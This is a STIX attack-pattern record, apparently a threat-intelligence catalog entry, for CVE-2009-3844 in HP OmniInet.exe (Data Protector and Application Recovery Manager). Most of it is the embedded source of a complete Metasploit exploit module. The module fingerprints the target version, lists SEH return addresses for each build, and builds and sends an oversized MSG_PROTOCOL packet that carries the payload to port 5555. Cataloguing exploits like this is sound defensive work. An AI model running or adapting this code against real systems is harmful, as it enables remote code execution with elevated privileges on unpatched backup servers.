{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed23e167-3689-42ad-b9af-84ea67964046",
    "created": "2024-08-14T16:47:15.610016Z",
    "modified": "2024-08-14T16:47:15.610021Z",
    "name": "HP OmniInet.exe MSG_PROTOCOL Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in the Hewlett-Packard OmniInet NT Service. By sending a specially crafted MSG_PROTOCOL (0x010b) packet, a remote attacker may be able to execute arbitrary code with elevated privileges.  This service is installed with HP OpenView Data Protector, HP Application Recovery Manager and potentially other products. This exploit has been tested against versions 6.1, 6.0, and 5.50 of Data Protector. and versions 6.0 and 6.1 of Application Recovery Manager.  NOTE: There are actually two consecutive wcscpy() calls in the program (which may be why ZDI considered them two separate issues). However, this module only exploits the second one. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_omniinet_2.rb",
            "external_id": "hp_omniinet_2.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3844"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OmniInet.exe MSG_PROTOCOL Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in the Hewlett-Packard\n        OmniInet NT Service. By sending a specially crafted MSG_PROTOCOL (0x010b)\n        packet, a remote attacker may be able to execute arbitrary code with elevated\n        privileges.\n\n        This service is installed with HP OpenView Data Protector, HP Application\n        Recovery Manager and potentially other products. This exploit has been tested\n        against versions 6.1, 6.0, and 5.50 of Data Protector. and versions 6.0 and 6.1\n        of Application Recovery Manager.\n\n        NOTE: There are actually two consecutive wcscpy() calls in the program (which\n        may be why ZDI considered them two separate issues). However, this module only\n        exploits the second one.\n      },\n      'Author'         =>\n        [\n          'EgiX <n0b0d13s[at]gmail.com>',\n          'Fairuzan Roslan <riaf[at]mysec.org>',\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-3844' ],\n          [ 'BID', '37250' ],\n          [ 'OSVDB', '60852' ],\n          [ 'ZDI', '09-091' ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload' =>\n        {\n          'Space'    => 4658,\n          'BadChars' => \"\\x00\", # (we don't want \\x00\\x00)\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic Targeting', { 'auto' => true }  ],\n\n          # DP Targets\n          [ 'HP OpenView Storage Data Protector A.05.50: INET, internal build 330',\n            {\n              'Ret' => 0x004406cf # p/p/r - OmniInet.exe (v5.50.330.0)\n            }\n          ],\n          [ 'HP OpenView Storage Data Protector A.06.00: INET, internal build 331',\n            {\n              'Ret' => 0x0044327d # p/p/r - OmniInet.exe (v6.0.331.0)\n            }\n          ],\n\n          # APPRM Targets\n          [ 'HP StorageWorks Application Recovery Manager A.06.00: INET, internal build 81',\n            {\n              'Ret' => 0x004280ff # p/p/r - OmniInet.exe (v6.0.81.0)\n            }\n          ],\n          [ 'HP Application Recovery Manager software A.06.10: INET, internal build 282',\n            {\n              'Ret' => 0x004412ed # p/p/r - OmniInet.exe (v6.0.282.0)\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-12-17'))\n\n    register_options([Opt::RPORT(5555)])\n  end\n\n  def check\n    connect\n    sock.put(rand_text_alpha_upper(64))\n    resp = sock.get_once(-1,5)\n    disconnect\n\n    if (resp)\n      resp = resp.unpack('v*').pack('C*')\n      print_status(\"Received response: \" + resp)\n\n      # extract version\n      if (resp =~ /HP Data Protector/)\n        version = resp.split[3]\n      elsif (resp =~ /HP OpenView Storage Data Protector/)\n        version = resp.split[5]\n      elsif (resp =~ /HP StorageWorks Application Recovery Manager/)\n        version = resp.split[5]\n      else\n        return Exploit::CheckCode::Detected\n      end\n\n      version = version.split('.')\n      major = version[1].to_i\n      minor = version[2].to_i\n      if ((major < 6) or (major == 6 and minor < 11))\n        return Exploit::CheckCode::Appears\n      end\n\n      if ((major > 6) or (major == 6 and minor >= 11))\n        return Exploit::CheckCode::Safe\n      end\n\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    mytarget = target\n\n    if (target['auto'])\n      mytarget = nil\n\n      print_status(\"Automatically detecting the target...\")\n\n      connect\n      sock.put(rand_text_alpha_upper(64))\n      resp = sock.get_once(-1,5)\n      disconnect\n\n      if not resp\n        fail_with(Failure::Unknown, \"No version response returned.\")\n      end\n\n      resp = resp.unpack('v*').pack('C*')\n      print_status(\"Received response: \" + resp)\n\n      self.targets.each do |t|\n        if (resp =~ /#{t.name}/) then\n          mytarget = t\n          break\n        end\n      end\n\n      if (not mytarget)\n        fail_with(Failure::NoTarget, \"No matching target\")\n      end\n\n      print_status(\"Selected Target: #{mytarget.name}\")\n    else\n      print_status(\"Trying target #{mytarget.name}...\")\n    end\n\n    # separator between arguments\n    sep = [0x2000].pack('N')\n\n    # Unicode BOM\n    pkt = \"\\xff\\xfe\"\n    # MSG_PROTOCOL command\n    pkt << Rex::Text.to_unicode(\"267\")\n\n    # dunno\n    4.times do\n      pkt << sep\n      pkt << rand_text_alpha_upper(2)\n    end\n\n    # culprit string\n    pkt << sep\n\n    # the payload + seh record\n    pkt << payload.encoded\n    pkt << generate_seh_record(mytarget.ret)\n\n    # jump back\n    dist = payload_space + 8\n    pkt << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + dist.to_s).encode_string\n\n    # force exception hitting the end of the stack\n    pkt << rand_text_alphanumeric(1000) * 25\n\n    # end marker\n    pkt << sep\n\n    # packet length\n    buff = [pkt.length].pack('N')\n    buff << pkt\n\n    connect\n    print_status(\"Sending MSG_PROTOCOL packet...\")\n    sock.put(buff)\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-12-17",
    "x_mitre_platforms": [
        "win'"
    ]
}